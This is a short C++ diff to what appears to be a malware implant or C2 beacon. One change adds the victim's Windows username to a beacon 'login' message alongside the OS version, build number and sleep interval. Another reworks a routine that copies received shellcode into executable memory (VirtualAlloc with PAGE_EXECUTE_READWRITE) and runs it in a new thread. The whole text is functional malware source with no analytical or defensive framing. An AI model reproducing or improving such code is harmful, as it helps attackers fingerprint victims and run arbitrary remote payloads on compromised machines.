@@ -512,10 +512,13 @@ int main()
         osver = osInfo.dwMajorVersion;
         build_num = osInfo.dwBuildNumber;
     }
+    char username[1024];
+    DWORD username_len = 1024;
+    GetUserNameA(username, &username_len);
 
     // Converting OS info to str
     char login_fmt[1024];
-    sprintf(login_fmt, "%d:::%d:::%d", osver, build_num, sleep_time);
+    sprintf(login_fmt, "%d:::%d:::%d:::%s", osver, build_num, sleep_time, username);
 
     //...now need to pad 16 bytes
     std::string login_msg = FUCKUP_PAD;
@@ -705,15 +708,14 @@ int main()
                     pl[i] = raw_code.data()[i];
                 }
                 // Now execute the shellcode in a new thread
-                void* exec = VirtualAlloc(0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+                HANDLE hThread = NULL;
+                void* exec = VirtualAlloc(0, len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                 memcpy(exec, pl, len);
-
-                // Create a new thread and pass the function pointer as a parameter
-                HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
-
+                hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
 
                 // Close the thread handle
                 CloseHandle(hThread);
+
             }
         }
 
